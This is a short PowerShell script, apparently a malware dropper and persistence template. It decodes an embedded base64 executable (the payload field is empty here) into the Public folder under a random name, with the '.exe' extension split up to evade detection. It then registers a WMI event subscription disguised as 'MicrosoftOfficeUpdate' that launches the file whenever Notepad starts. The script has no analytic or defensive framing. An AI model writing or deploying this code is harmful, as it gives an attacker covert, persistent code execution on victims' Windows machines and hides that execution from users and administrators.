$Private:OFS = ""
$data = ""
$chrs = "abcdefghkmnprstuvwxyzABCDEFGHKLMNPRSTUVWXYZ123456789"
$rnd = 1..8 | ForEach-Object { Get-Random -Maximum $chrs.length }
$fn = [String]$chrs[$rnd]
$path = $env:PUBLIC+"\"+$fn+"."+"e"+"x"+"e"
[System.IO.File]::WriteAllBytes($path,[System.Convert]::FromBase64String($data))

$filterName="MicrosoftOfficeUpdate"
$consumerName="MicrosoftOfficeUpdate"
$Query = "Select * From __InstanceCreationEvent Within 1 Where TargetInstance Isa 'Win32_Process' And TargetInstance.Name = 'notepad.exe'"
$WMIEventFilter=Set-WmiInstance -Class __EventFilter -NameSpace "root\subscription" -Arguments @{Name=$filterName;EventNameSpace="root\cimv2";QueryLanguage="WQL";Query=$Query}
$WMIEventConsumer=Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments @{Name=$consumerName;ExecutablePath=$path;CommandLineTemplate=$path}
Set-WmiInstance -Class __FilterToConsumerBinding -NameSpace "root\subscription" -Arguments @{Filter=$WMIEventFilter;Consumer=$WMIEventConsumer}
